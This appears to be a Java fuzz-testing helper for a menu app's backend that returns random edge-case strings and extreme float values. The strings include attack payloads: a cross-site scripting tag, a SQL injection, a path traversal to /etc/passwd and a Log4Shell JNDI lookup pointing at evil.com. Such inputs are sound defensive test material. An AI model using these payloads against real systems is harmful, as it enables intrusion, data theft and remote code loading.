package com.example.cardapio.backendTests.utils;

import java.util.Random;

public class FuzzGenerator {

    private static final Random random = new Random();

    public static String randomWeirdString() {
        String[] patterns = {
                "",
                " ",
                "🔥🔥🔥",
                "<script>alert(1)</script>",
                "' OR 1=1 --",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "💀💀💀",
                "null",
                "undefined"
        };

        return patterns[random.nextInt(patterns.length)];
    }

    public static float randomExtremeFloat() {
        float[] values = {
                -1000f,
                0f,
                Float.MAX_VALUE,
                Float.MIN_VALUE,
        };

        return values[random.nextInt(values.length)];
    }
}
